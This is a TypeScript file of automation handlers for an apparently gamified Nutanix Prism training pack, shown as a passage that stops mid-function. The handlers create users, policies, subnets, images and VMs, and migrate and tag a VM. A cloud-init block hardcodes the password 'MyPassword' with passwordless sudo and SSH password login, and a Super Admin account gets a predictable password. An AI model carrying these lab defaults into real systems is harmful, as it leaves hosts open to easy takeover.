/**
 * Act + cleanup handlers for the ntnx-infiltration pack. An **act** performs
 * the cluster step a player would do in Prism (create user, VM, category, …);
 * auto-play fires it for the awaiting stage so the check finds what it expects.
 * A **cleanup** undoes it by name. Both are idempotent.
 *
 * Fired by `/api/act/run|cleanup/:trigram/:stage` (manual), `/auto-play/:trigram`
 * (walks pack order), and `/cleanup-all/:trigram` (reverse sweep).
 *
 * Transport mix is deliberate: the generated SDK crashes Bun on non-2xx (its
 * error-wrap does `err.data=...` on a frozen response-error, an uncaught
 * TypeError). So reads use the SDK (200 is safe, typed, paginated); writes and
 * deletes go through REST (`postV4`/`putV4`/`deleteV4Entity`), which throws a
 * clean `NutanixHttpError`. v3 endpoints are always REST (no SDK exists).
 */
import type { ActContext } from '@ntnx-game/engine';
import type { NutanixSdk } from '@ntnx-game/nutanix';
import {
  deleteV4Entity,
  ensure,
  getTrigram,
  getV4WithEtag,
  getVarString,
  listAllSdk,
  listAllV3,
  listAllV4Rest,
  postV4,
  postV4Action,
  putV4,
} from './helpers';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type AnyRec = Record<string, any>;

function sdk(ctx: ActContext): NutanixSdk {
  return ctx.nutanix.sdk as NutanixSdk;
}

/** Look up a PC user's uuid by username (case-insensitive) via v4 IAM.
 *  Returns undefined on miss/error — callers degrade gracefully. */
async function findUserUuid(ctx: ActContext, name: string): Promise<string | undefined> {
  try {
    // Paginate like every other IAM-users lookup in this file; a bare
    // $limit=100 GET silently misses the user on PCs with >100 users.
    const users = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.users.listUsers($p));
    const u = users.find(
      (e) => (e?.username ?? '').toLowerCase() === name.toLowerCase(),
    );
    return u?.extId as string | undefined;
  } catch (err) {
    ctx.logger.warn('findUserUuid failed', { name, err: String(err).slice(0, 200) });
    return undefined;
  }
}

// ───────────────────────────────────────────────────────────────────────
//  Seeds: create the resources downstream stages need
// ───────────────────────────────────────────────────────────────────────

/** Stage 6 create-admin-user: creates `{Trigram}-adm` with Super Admin intent. */
async function actCreateAdminUser(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const username = `${trigram}-adm`;
  // IAM v4 enforces ≥ 8 chars on `password`. The player's PIN is typically
  // 4 digits, so we derive a deterministic 13+ char password from the
  // trigram instead. Player never logs in as `{Trigram}-adm` during the
  // game (it's a narrative artifact), so the actual value doesn't matter
  // for gameplay, only that IAM accepts it.
  const password = `ChangeMe-${trigram}-1!`;
  const usernameLc = username.toLowerCase();
  await ensure<AnyRec>({
    name: `user ${username}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).iam.users.listUsers($p)),
    match: (u) => (u.username ?? '').toLowerCase() === usernameLc,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(ctx, '/api/iam/v4.0/authn/users', {
        username,
        userType: 'LOCAL',
        firstName: trigram.toUpperCase(),
        lastName: 'Admin',
        displayName: username,
        password,
        status: 'ACTIVE',
      })).data,
  });
}

/** Stage 7 create-auth-policy: creates `{Trigram}-auth` granting Super Admin to `{Trigram}-adm`. */
async function actCreateAuthPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-auth`;
  const users = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.users.listUsers($p));
  const wantUserLc = `${trigram}-adm`.toLowerCase();
  const target = users.find((u) => (u.username ?? '').toLowerCase() === wantUserLc);
  if (!target?.extId) {
    ctx.logger.warn(`actCreateAuthPolicy: user ${trigram}-adm not found; run actCreateAdminUser first`);
    return;
  }
  const roles = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.roles.listRoles($p));
  const superAdmin = roles.find((r) => /super admin/i.test(r.displayName ?? r.name ?? ''));
  if (!superAdmin?.extId) {
    ctx.logger.warn('actCreateAuthPolicy: Super Admin role not found');
    return;
  }
  const nameLc = name.toLowerCase();
  await ensure<AnyRec>({
    name: `auth-policy ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).iam.authzPolicies.listAuthorizationPolicies($p)),
    match: (p) => (p.displayName ?? '').toLowerCase() === nameLc,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(
        ctx,
        '/api/iam/v4.0/authz/authorization-policies',
        {
          // Shape confirmed against live PC GET: identities use a
          // nested `identityFilter.user.uuid.anyof[]`, not the flat
          // `user.values[]` guess from the spec. Same story for
          // entities, `entityFilter: { "*": ... }`, not bare `*`.
          displayName: name,
          role: superAdmin.extId,
          identities: [
            { identityFilter: { user: { uuid: { anyof: [target.extId] } } } },
          ],
          entities: [{ entityFilter: { '*': { '*': { eq: '*' } } } }],
          authorizationPolicyType: 'USER_DEFINED',
        },
      )).data,
  });
}

/** Stage 9 create-project: v3 `/api/nutanix/v3/projects` with cluster +
 * Nutanix account ("Infrastructure tab" binding) + secondary subnet.
 * Python `CheckProject` rejects a project without `account_reference_list`.
 * Adding the bare `cluster_reference_list` (what we did before) doesn't
 * count as "infrastructure" in NCM's data model. */
async function actCreateProject(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-proj`;
  const existing = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/projects/list',
    { length: 250 },
  );
  if (existing.entities?.some((p) => p.spec?.name === name || p.status?.name === name)) {
    ctx.logger.info(`act noop: project ${name} already exists`);
    return;
  }
  const clusters = await ctx.nutanix.rest.request<{ data?: Array<{ extId?: string }> }>(
    'GET',
    '/api/clustermgmt/v4.0/config/clusters',
  );
  const clusterUuid = clusters.data?.[0]?.extId;
  // The "Infrastructure tab → Add infrastructure" UI step picks the
  // Nutanix-managed account that fronts the cluster. PC ships with one
  // implicit `nutanix_pc` account (`NTNX_LOCAL_AZ`); pick that one. v4
  // doesn't expose accounts so we use v3 `/accounts/list` like the SDK.
  const accountsResp = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/accounts/list',
    { length: 100 },
  );
  const account = accountsResp.entities?.find(
    (a) => (a.status?.resources?.type ?? a.spec?.resources?.type) === 'nutanix_pc',
  );
  if (!account?.metadata?.uuid) {
    ctx.logger.warn(
      'actCreateProject: no nutanix_pc account on PC, project will be created without an infrastructure binding (CheckProject will fail)',
    );
  }
  // Secondary subnet binding mirrors what the stage prompt asks the
  // player to pick (`Use the VLAN named secondary`). Best-effort:
  // if missing, project still creates but with empty subnet list.
  const subnets = await listAllSdk<AnyRec>(($p) => sdk(ctx).networking.subnets.listSubnets($p));
  const secondary = subnets.find((s) => /^secondary$/i.test(s.name ?? ''));
  // The prompt asks for "user TheProjectManager as Project Admin". Add it as a
  // project member so the create-vm Manage Ownership step can set owner=
  // theprojectmanager (impossible if the user isn't in the project).
  const pmUuid = await findUserUuid(ctx, 'theprojectmanager');
  if (!pmUuid) {
    ctx.logger.warn('actCreateProject: theprojectmanager user not found, project created without it');
  }
  await ctx.nutanix.rest.request('POST', '/api/nutanix/v3/projects', {
    spec: {
      name,
      resources: {
        cluster_reference_list: clusterUuid
          ? [{ kind: 'cluster', uuid: clusterUuid }]
          : [],
        account_reference_list: account?.metadata?.uuid
          ? [{ kind: 'account', uuid: account.metadata.uuid }]
          : [],
        subnet_reference_list: secondary?.extId
          ? [{ kind: 'subnet', name: secondary.name, uuid: secondary.extId }]
          : [],
        user_reference_list: pmUuid
          ? [{ kind: 'user', name: 'theprojectmanager', uuid: pmUuid }]
          : [],
      },
    },
    metadata: { kind: 'project', name },
    api_version: '3.1',
  });
}

/** Stage 10 create-subnet: creates `{Trigram}-subnet` on VLAN `{Vlanid}` with
 * Nutanix IPAM enabled (`192.168.{Vlanid}.0/24`, gateway `.1`, pool .50–.200)
 * matching the stage prompt. IPAM is required upstream of stage 12: AHV
 * refuses a 2-NIC VM combining a non-IPAM subnet with another (CheckVM's
 * NIC-count assertion would never pass otherwise). */
async function actCreateSubnet(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-subnet`;
  const vlanRaw = getVarString(ctx, 'Vlanid');
  const vlanId = vlanRaw ? Number.parseInt(vlanRaw, 10) : undefined;
  if (!Number.isFinite(vlanId)) {
    // Throw rather than silently `return`: auto-play would then submit "Ok"
    // against a missing subnet and the player gets a useless "subnet not
    // found" check failure. Bailing loud lets the UI banner point at the
    // real cause.
    throw new Error(
      "actCreateSubnet: Vlanid missing on session — allocateVlanId() didn't seed it at session create; check server logs.",
    );
  }
  const clusters = await ctx.nutanix.rest.request<{ data?: Array<{ extId?: string }> }>(
    'GET',
    '/api/clustermgmt/v4.0/config/clusters',
  );
  const clusterUuid = clusters.data?.[0]?.extId;
  // 192.168.{Vlanid}.0/24 carved per the stage prompt. Pool range chosen
  // wide enough to lease 2 IPs (the player's VM has 2 NICs) without
  // colliding with a manual gateway/static-ip workflow on .1–.49.
  const subnetBase = `192.168.${vlanId}`;
  await ensure<AnyRec>({
    name: `subnet ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).networking.subnets.listSubnets($p)),
    match: (s) => s.name === name,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(ctx, '/api/networking/v4.0/config/subnets', {
        name,
        subnetType: 'VLAN',
        networkId: vlanId,
        clusterReference: clusterUuid,
        isExternal: false,
        // `isAdvancedNetworking: true` is required so AHV will accept this
        // subnet on a 2-NIC VM alongside the cluster's `secondary` subnet
        // (which is also advanced). Without it the kVmCreate task fails
        // with VMM-30102 INVALID_ARGUMENT. Mirrors Python `CheckNetwork`
        // which calls `checkSubnetAdvanced` and rejects non-advanced.
        isAdvancedNetworking: true,
        ipConfig: [
          {
            ipv4: {
              ipSubnet: {
                ip: { value: `${subnetBase}.0` },
                prefixLength: 24,
              },
              defaultGatewayIp: { value: `${subnetBase}.1` },
              poolList: [
                {
                  startIp: { value: `${subnetBase}.50` },
                  endIp: { value: `${subnetBase}.200` },
                },
              ],
            },
          },
        ],
      })).data,
  });
}

/** Stage 11 add-ubuntu-image: uploads `{Trigram}-ubuntu` from GAME_IMAGE_URL. */
async function actAddUbuntuImage(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-ubuntu`;
  const url = getVarString(ctx, 'ImageURL');
  if (!url) {
    throw new Error(
      'actAddUbuntuImage: ImageURL missing: set GAME_IMAGE_URL in .env',
    );
  }
  // Pre-existence check: if the image is already there from a previous run,
  // skip the POST entirely.
  const existing = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.images.listImages($p));
  if (existing.find((i) => i.name === name)) {
    ctx.logger.info(`act noop: image ${name} already exists`);
    return;
  }
  // POST kicks off the URL-source download; the image appears in the list
  // a few seconds *after* the 202 (Ubuntu Jammy is ~280 MB, the PC fetches
  // it on its own). Returning before the image is listable would let the
  // immediately-following stage check fail with "not found in library", so
  // poll until either the image is visible (success) or we hit the 90 s
  // budget (the player can re-run; we don't want auto-play to hang
  // forever on a transient HPoC).
  ctx.logger.info(`act create: image ${name}`);
  await postV4<{ data?: AnyRec }>(ctx, '/api/vmm/v4.0/content/images', {
    name,
    type: 'DISK_IMAGE',
    source: { '$objectType': 'vmm.v4.content.UrlSource', url },
  });
  const deadline = Date.now() + 90_000;
  while (Date.now() < deadline) {
    const list = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.images.listImages($p));
    if (list.find((i) => i.name === name)) {
      ctx.logger.info(`act image ${name} visible`);
      return;
    }
    await new Promise((r) => setTimeout(r, 3_000));
  }
  throw new Error(
    `actAddUbuntuImage: image ${name} did not appear within 90s after POST`,
  );
}

/** Cloud-init userData mirroring stage-012 prompt: users `nutanix` + `admin`
 * with sudo NOPASSWD and password `MyPassword`. v4 expects the value
 * base64-encoded under `guestCustomization.config.cloudInitScript.value`.
 *
 * The `write_files`/`runcmd` netplan block makes NIC order irrelevant: the VM
 * has 2 NICs (`{Trigram}-subnet` isolated VLAN + `secondary` routable network)
 * and the Ubuntu image only DHCPs the first interface by default. If the
 * isolated subnet lands on eth0 the VM is unreachable from the SSH console.
 * Matching `e*` and DHCPing every interface brings `secondary` up regardless
 * of order, so the connected /24 route lets the console reach the VM. Single
 * file (overwrites 50-cloud-init.yaml) to avoid netplan's "interface matched
 * by multiple definitions" error. Keep this YAML in sync with the
 * stage-012.line-10 code block the player is told to paste (en/fr/de). */
const STAGE12_CLOUD_INIT_YAML = `#cloud-config
users:
  - name: nutanix
    shell: /bin/bash
    sudo: ['ALL=(ALL) NOPASSWD:ALL']
  - name: admin
    shell: /bin/bash
    sudo: ['ALL=(ALL) NOPASSWD:ALL']
    primary_group: users
    groups: [sudo]
    no_user_group: true
chpasswd:
  list: |
    nutanix:MyPassword
    admin:MyPassword
  expire: false
ssh_pwauth: true
write_files:
  - path: /etc/netplan/50-cloud-init.yaml
    permissions: '0600'
    content: |
      network:
        version: 2
        ethernets:
          all-eths:
            match:
              name: "e*"
            dhcp4: true
runcmd:
  - netplan apply
`;

/** Stage 12 create-vm: creates `{Trigram}-vm` matching the prompt: 2 vCPU,
 * 4 GB RAM, UEFI, 2 NICs (`secondary` + `{Trigram}-subnet`), boot disk from
 * the player's image, cloud-init for nutanix+admin users, then assigns to
 * `{Trigram}-proj` via v3 Manage-Ownership. Tightened CheckVM (parity with
 * Python `CheckVM`) requires every one of these fields. */
async function actCreateVm(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-vm`;
  const subnets = await listAllSdk<AnyRec>(($p) => sdk(ctx).networking.subnets.listSubnets($p));
  const subnet = subnets.find((s) => s.name === `${trigram}-subnet`);
  // `secondary` is the literal subnet name used in the stage prompt, the
  // same name the player is asked to pick. Match case-insensitively to
  // tolerate clusters that name it `Secondary`.
  const secondary = subnets.find((s) => /^secondary$/i.test(s.name ?? ''));
  if (!secondary) {
    ctx.logger.warn(
      `actCreateVm: 'secondary' subnet missing on cluster, VM will be created with 1 NIC and CheckVM (NIC-count) will fail`,
    );
  }
  const images = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.images.listImages($p));
  const image = images.find((i) => i.name === `${trigram}-ubuntu`);
  const clusters = await ctx.nutanix.rest.request<{ data?: Array<{ extId?: string }> }>(
    'GET',
    '/api/clustermgmt/v4.0/config/clusters',
  );
  const clusterUuid = clusters.data?.[0]?.extId;
  // Track whether we just created the VM (vs found pre-existing): only fire
  // the recovery-point creation on a fresh VM so re-runs don't pile up RPs.
  let justCreated = false;
  await ensure<AnyRec>({
    name: `vm ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).vmm.vms.listVms($p)),
    match: (v) => v.name === name,
    create: async () => {
      justCreated = true;
      return undefined as unknown as AnyRec;
    },
  });
  // Re-fetch with the actual creation if it happened. Inline the create
  // call here to keep the existing logic; ensure's "create" is just a
  // sentinel to trigger the post-create RP step.
  if (justCreated) {
    const nics: AnyRec[] = [];
    if (subnet) {
      nics.push({
        networkInfo: {
          nicType: 'NORMAL_NIC',
          subnet: { extId: subnet.extId },
          vlanMode: 'ACCESS',
        },
      });
    }
    if (secondary) {
      nics.push({
        networkInfo: {
          nicType: 'NORMAL_NIC',
          subnet: { extId: secondary.extId },
          vlanMode: 'ACCESS',
        },
      });
    }
    await postV4<{ data?: AnyRec }>(ctx, '/api/vmm/v4.0/ahv/config/vms', {
      name,
      description: `Seeded for ${trigram}`,
      cluster: clusterUuid ? { extId: clusterUuid } : undefined,
      numSockets: 2,
      numCoresPerSocket: 1,
      memorySizeBytes: 4294967296,
      bootConfig: { '$objectType': 'vmm.v4.ahv.config.UefiBoot' },
      nics,
      disks: image
        ? [
            {
              backingInfo: {
                '$objectType': 'vmm.v4.ahv.config.VmDisk',
                dataSource: {
                  reference: {
                    '$objectType': 'vmm.v4.ahv.config.ImageReference',
                    imageExtId: image.extId,
                  },
                },
              },
              diskAddress: { busType: 'SCSI', index: 0 },
            },
          ]
        : [],
      guestCustomization: {
        config: {
          '$objectType': 'vmm.v4.ahv.config.CloudInit',
          cloudInitScript: {
            '$objectType': 'vmm.v4.ahv.config.Userdata',
            value: Buffer.from(STAGE12_CLOUD_INIT_YAML, 'utf8').toString('base64'),
          },
        },
      },
    });
    // Poll until the new VM appears in listVms: `vmCreate` returns 202
    // + a task ref, the VM may take 5–20 s to propagate. A short single
    // wait + fetch was racing on slower clusters: lookup further down
    // would miss the VM and the power-on branch never fired, leaving
    // auto-play to submit "Ok" against an OFF VM and CheckVM failing.
    let created: AnyRec | undefined;
    for (let i = 0; i < 30; i++) {
      await new Promise((r) => setTimeout(r, 1500));
      const refreshed = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
      created = refreshed.find((v) => v.name === name);
      if (created?.extId) break;
    }
    if (!created?.extId) {
      ctx.logger.warn(`actCreateVm: VM ${name} did not appear in listVms after 45s, power-on branch will skip`);
    }
    if (created?.extId) {
      // Mirror Python `CheckVM`'s side-effect: kick off a recovery point
      // for the freshly created VM so stage 26 `restore-vm-from-recovery`
      // has something to roll back to. Best-effort: failure is logged
      // but doesn't block the act (recovery-points endpoint may be
      // unavailable on minimal HPoCs).
      try {
        await postV4(ctx, '/api/dataprotection/v4.0/config/recovery-points', {
          vmRecoveryPoints: [{ vmExtId: created.extId }],
        });
        ctx.logger.info('actCreateVm: recovery point created', { vm: name });
      } catch (err) {
        ctx.logger.warn('actCreateVm: recovery-point creation failed', {
          err: String(err).slice(0, 150),
        });
      }
    }
  }
  // Project ownership: stage prompt asks the player to use Manage Ownership
  // in Prism. v4 doesn't expose project on VMs, so PUT v3 with the
  // project_reference patched in. GET-modify-PUT the full entity (v3
  // enforces spec_version concurrency). Idempotent: runs on every act
  // call so a previously-failed assignment can be retried, and skips when
  // the project is already correct. Best-effort: unavailable v3 → log +
  // continue (CheckVM also defaults to pass when v3 is unreachable).
  // Prefer the captured var, else look the project up by name. Auto-play /
  // fresh resume may not hold ProjectUUID in session, which used to silently
  // skip the assignment (VM left ownerless → CheckVM fails).
  const projVar = ctx.vars.get('ProjectUUID');
  let projUuid: string | undefined =
    typeof projVar === 'string' && projVar.length > 0 ? projVar : undefined;
  if (!projUuid) {
    try {
      const projects = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
        'POST',
        '/api/nutanix/v3/projects/list',
        { length: 250 },
      );
      projUuid = (projects?.entities ?? []).find(
        (e) =>
          e?.spec?.name === `${trigram}-proj` ||
          e?.status?.name === `${trigram}-proj` ||
          e?.metadata?.name === `${trigram}-proj`,
      )?.metadata?.uuid;
    } catch (err) {
      ctx.logger.warn('actCreateVm: project lookup failed', { err: String(err).slice(0, 200) });
    }
  }
  // Manage Ownership sets BOTH project + owner on the VM. Owner = theproject-
  // manager (a project member, added at create-project). Set both in one v3 PUT.
  const pmUuid = await findUserUuid(ctx, 'theprojectmanager');
  const lookup = (await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p))).find((v) => v.name === name);
  if (lookup?.extId && (projUuid || pmUuid)) {
    try {
      const v3vm = await ctx.nutanix.rest.request<AnyRec>(
        'GET',
        `/api/nutanix/v3/vms/${lookup.extId}`,
      );
      const meta = (v3vm?.metadata as AnyRec) ?? {};
      let changed = false;
      if (projUuid && meta.project_reference?.uuid !== projUuid) {
        meta.project_reference = { kind: 'project', uuid: projUuid };
        changed = true;
      }
      if (pmUuid && meta.owner_reference?.uuid !== pmUuid) {
        meta.owner_reference = { kind: 'user', name: 'theprojectmanager', uuid: pmUuid };
        changed = true;
      }
      if (changed) {
        // v3 PUT echoes the GET body but rejects `status` (server-controlled
        // view, re-sending triggers 422). Strip before PUT.
        const { status: _drop, ...putBody } = v3vm as AnyRec;
        await ctx.nutanix.rest.request('PUT', `/api/nutanix/v3/vms/${lookup.extId}`, {
          ...putBody,
          metadata: meta,
        });
        ctx.logger.info('actCreateVm: ownership assigned', { vm: name, project: projUuid, owner: pmUuid });
      }
    } catch (err) {
      ctx.logger.warn('actCreateVm: ownership assignment failed (v3 unavailable?)', {
        err: String(err).slice(0, 200),
      });
    }
  }
  // Power on the VM. CheckVM / CheckRestoreVM both require powerState
  // === 'ON' so this act CAN'T return until that's stably true. Loop
  // for up to 240 s, retrying power-on whenever we observe an OFF
  // state. Earlier `try once + then poll` failed live: power-on POST
  // returns 4xx when the VM is still in v4 PROVISIONING (just-created)
  // and the silent-warn-then-poll path never recovers (auto-play
  // submitted Ok 3× on a still-OFF VM, operator had to power-on
  // manually). Now we re-issue the POST every iteration if powerState
  // !== 'ON', so as soon as AHV settles into OFF the next iteration
  // lands a successful power-on. Idempotent: AHV silently 4xxs when
  // already ON; we exit on first ON observation.
  const POLL_MS = 2_000;
  const POLL_CAP = 120;          // 240 s max
  let powerOnFiredAt = -1;        // iteration when the last successful POST landed
  for (let i = 0; i < POLL_CAP; i++) {
    let current: AnyRec | undefined;
    try {
      current = (await listAllSdk<AnyRec>(($p) =>
        sdk(ctx).vmm.vms.listVms($p),
      )).find((v) => v.name === name);
    } catch (err) {
      ctx.logger.warn('actCreateVm: list poll failed (transient?)', {
        err: String(err).slice(0, 150),
      });
      await new Promise((r) => setTimeout(r, POLL_MS));
      continue;
    }
    if (current?.powerState === 'ON') {
      ctx.logger.info('actCreateVm: VM is ON', {
        vm: name,
        afterIter: i,
        firedAtIter: powerOnFiredAt,
      });
      break;
    }
    // Re-fire power-on every poll iteration until we see ON. If
    // current.extId isn't known yet (vmCreate task still in flight),
    // skip this iteration: list will eventually return the entity.
    // We deliberately re-POST even after a previous success: AHV may
    // silently drop the request mid-creation, and the next
    // iteration-after-OFF will retry; an idempotent power-on on an
    // already-ON VM is a 4xx that we catch + ignore.
    if (current?.extId) {
      try {
        await postV4Action(
          ctx,
          `/api/vmm/v4.2/ahv/config/vms/${current.extId}`,
          '$actions/power-on',
        );
        powerOnFiredAt = i;
      } catch (err) {
        // Most common: 4xx because VM still PROVISIONING, or already
        // ON, or transient. Log only the first few attempts to avoid
        // log spam.
        if (i < 3 || i % 10 === 0) {
          ctx.logger.warn('actCreateVm: power-on POST rejected (will retry)', {
            iter: i,
            powerState: current.powerState,
            err: String(err).slice(0, 150),
          });
        }
      }
    }
    if (i === POLL_CAP - 1) {
      ctx.logger.warn(
        `actCreateVm: VM ${name} still not ON after ${POLL_CAP * POLL_MS / 1000}s, last powerState=${current?.powerState ?? 'unknown'}`,
      );
      break;
    }
    await new Promise((r) => setTimeout(r, POLL_MS));
  }
}

/**
 * Stage 14 live-migrate-vm: ensures VM is powered on (so it has a host),
 * captures current host, migrates to a different host. CheckLiveMigration
 * then compares the VM's current host against the captured `HostUUID`.
 *
 * If the VM is powered off (CheckVM allows that), we power it on + wait
 * for host assignment, then migrate. If the cluster has only one AHV host,
 * migration is impossible and we log + return: the check will fail as
 * expected on a single-host cluster.
 */
async function actLiveMigrateVm(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const vmName = `${trigram}-vm`;
  let vms = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
  let vm = vms.find((v) => v.name === vmName);
  if (!vm?.extId) return;
  // Idempotency: this stage has TWO `<input/>` prompts (one for "logged in
  // as admin", one for "migrated"), so auto-play fires the act twice. The
  // baseline `HostUUID` is captured on the first call. Re-migrating on the
  // second call would toggle the VM back to the original host and the
  // check would fail. So: if `HostUUID` is set AND the VM is no longer on
  // it, the migration succeeded: return early. If the VM is still on
  // HostUUID (a prior call's POST didn't settle), fall through and
  // re-fire the migration.
  if (ctx.vars.has('HostUUID')) {
    const baseline = String(ctx.vars.get('HostUUID') ?? '');
    const currentHost = vm?.host?.extId as string | undefined;
    if (currentHost && currentHost !== baseline) {
      ctx.logger.info('actLiveMigrateVm: already migrated, host differs from baseline');
      return;
    }
    ctx.logger.info('actLiveMigrateVm: HostUUID set but VM still on baseline, retry migrate');
  }
  // Power on if needed: migration requires a running VM with a placed host.
  if (vm.powerState !== 'ON') {
    try {
      // VM actions live on v4.2 + require If-Match ETag from a prior GET.
      await postV4Action(
        ctx,
        `/api/vmm/v4.2/ahv/config/vms/${vm.extId}`,
        '$actions/power-on',
        // No body on power-on: v4 rejects `{}` ("No request body is
        // expected but one was found").
      );
      ctx.logger.info('actLiveMigrateVm: powered on VM', { vmName });
      // Poll for host assignment (~5 s typical on AHV).
      for (let i = 0; i < 10; i++) {
        await new Promise((r) => setTimeout(r, 2000));
        vms = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
        vm = vms.find((v) => v.name === vmName);
        if (vm?.host?.extId) break;
      }
    } catch (err) {
      ctx.logger.warn('actLiveMigrateVm: power-on failed', { err: String(err) });
      return;
    }
  }
  const hostUuid = vm?.host?.extId as string | undefined;
  if (!hostUuid) {
    ctx.logger.warn(`actLiveMigrateVm: VM has no host after power-on, aborting migrate`);
    return;
  }
  // Capture pre-migration host so CheckLiveMigration has a baseline. Only
  // on the *first* run: a retry has the original baseline already and we
  // don't want to overwrite it with the post-migration host.
  if (!ctx.vars.has('HostUUID')) {
    ctx.vars.set('HostUUID', hostUuid, 'live-migrate-vm');
  }
  const hosts = await ctx.nutanix.rest.request<{ data?: Array<{ extId?: string }> }>(
    'GET',
    '/api/clustermgmt/v4.0/config/hosts',
  );
  const target = (hosts.data ?? []).find((h) => h.extId && h.extId !== hostUuid);
  if (!target?.extId) {
    ctx.logger.warn(`actLiveMigrateVm: no alternate host available for ${vmName}`);
    return;
  }
  try {
    // v4.2 action is `migrate-to-host` (within-cluster migration).
    // `migrate-vm` was a wrong guess: 404. `migrate` exists but is for
    // cross-cluster migrations.
    await postV4Action(
      ctx,
      `/api/vmm/v4.2/ahv/config/vms/${vm!.extId}`,
      '$actions/migrate-to-host',
      { host: { extId: target.extId } },
    );
    ctx.logger.info('actLiveMigrateVm: migrate initiated', {
      vmName, from: hostUuid, to: target.extId,
    });
    // Wait for migration to settle: the action is task-tracked (POST returns
    // 202, VM physically moves a few seconds later). If we return now and
    // the auto-play submits "Ok" immediately, the check sees the VM still
    // on the original host and fails. Poll up to 60 s for the host swap.
    // Each iteration's list call is in try/catch so a transient PLAT-10003
    // rate-limit doesn't bubble out of the act mid-poll and let auto-play
    // submit "Ok" before the host actually changes.
    const deadline = Date.now() + 60_000;
    while (Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 3_000));
      try {
        const refreshed = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
        const cur = refreshed.find((v) => v.name === vmName);
        if (cur?.host?.extId && cur.host.extId !== hostUuid) {
          ctx.logger.info('actLiveMigrateVm: migration settled', {
            vmName, host: cur.host.extId,
          });
          return;
        }
      } catch (err) {
        ctx.logger.warn('actLiveMigrateVm: poll list failed (transient?)', {
          err: String(err).slice(0, 150),
        });
      }
    }
    ctx.logger.warn('actLiveMigrateVm: migration did not settle within 60 s');
  } catch (err) {
    ctx.logger.warn('actLiveMigrateVm: migrate call failed', { err: String(err) });
  }
}

/** Stage 15 create-category: creates `{Trigram}-cat:Critical` and `{Trigram}-cat:Test`. */
async function actCreateCategory(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const key = `${trigram}-cat`;
  const existing = await listAllSdk<AnyRec>(($p) => sdk(ctx).prism.categories.listCategories($p));
  for (const value of ['Critical', 'Test']) {
    if (existing.some((c) => c.key === key && c.value === value)) continue;
    await postV4(ctx, '/api/prism/v4.2/config/categories', {
      key,
      value,
      description: `Seeded ${key}:${value}`,
    });
  }
}

/**
 * Stage 16 apply-category-to-vm: tags `{Trigram}-vm` with `{Trigram}-cat:
 * Critical`. v4 `associate-categories` action uses `categories: [{extId}]`;
 * the resulting association shows up on GET `/vms/{extId}/categories` (a
 * sub-resource), NOT on the list response's top-level `categories` field.
 * Need to fetch categories via the sub-endpoint to verify, but the check
 * (`CheckCatVM`) does that already. Seed just fires the action and trusts
 * the check to validate.
 */
async function actApplyCategoryToVm(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const vms = await listAllSdk<AnyRec>(($p) => sdk(ctx).vmm.vms.listVms($p));
  const vm = vms.find((v) => v.name === `${trigram}-vm`);
  if (!vm?.extId) return;
  const cats = await listAllSdk<AnyRec>(($p) => sdk(ctx).prism.categories.listCategories($p));
  const critical = cats.find((c) => c.key === `${trigram}-cat` && c.value === 'Critical');
  if (!critical?.extId) return;
  try {
    await postV4Action(
      ctx,
      `/api/vmm/v4.2/ahv/config/vms/${vm.extId}`,
      '$actions/associate-categories',
      { categories: [{ extId: critical.extId }] },
    );
  } catch (err) {
    ctx.logger.warn('actApplyCategoryToVm: associate failed', { err: String(err) });
    return;
  }
  // associate-categories is task-tracked: the POST returns 202, the binding
  // shows up on `/vms/{extId}?$select=categories` a few seconds later. If
  // we return now and auto-play submits "Ok" immediately, CheckCatVM sees
  // an empty categories list and rejects the stage. Poll until the binding
  // is visible (cap 30 s). Per-iteration try/catch so a transient rate-
  // limit doesn't bubble out and let auto-play fire too early.
  const deadline = Date.now() + 30_000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 1500));
    try {
      const refreshed = await ctx.nutanix.request<{
        data?: Array<{ extId?: string; name?: string; categories?: Array<{ extId?: string }> }>;
      }>('GET', `/api/vmm/v4.2/ahv/config/vms?%24select=extId,name,categories&%24filter=name%20eq%20'${trigram}-vm'`);
      const cur = refreshed.data?.find((v) => v.name === `${trigram}-vm`);
      const applied = (cur?.categories ?? []).some((c) => c.extId === critical.extId);
      if (applied) {
